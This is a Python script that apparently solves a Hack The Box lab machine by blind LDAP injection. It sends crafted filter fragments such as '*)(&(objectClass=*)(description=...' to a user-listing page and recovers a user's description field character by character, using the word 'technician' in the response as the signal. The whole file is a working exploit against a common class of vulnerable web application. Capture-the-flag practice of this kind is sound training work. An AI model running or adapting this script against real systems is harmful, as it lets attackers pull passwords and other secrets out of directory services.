import requests
import string
import sys

headers = {
    'Host': 'internal.analysis.htb',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=*)(password=*)',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

forbidden_chars = ['*']

def fuzz():
    found = ""
    while True:
        flag = False
        for fuzz in string.printable:
            if fuzz in forbidden_chars and len(found) != 6: # the 6th char of fuzz string is really * with no other meaning
                continue
            if len(found) != 6:
                fuzzing = fuzz + "*"
            else:
                fuzzing = fuzz

            url = f"http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=*)(description={found}{fuzzing})"
            response = requests.get(url, headers=headers, verify=False)
            sys.stdout.write(f"\r[*] FUZZING: {found}{fuzz}")
            sys.stdout.flush()

            if "technician" in response.text:
                flag = True
                found += fuzz
                break

        if not flag:
            break
    print(f"\r[!] FUZZING Done, Found: {found}")

if __name__ == '__main__':
    fuzz()
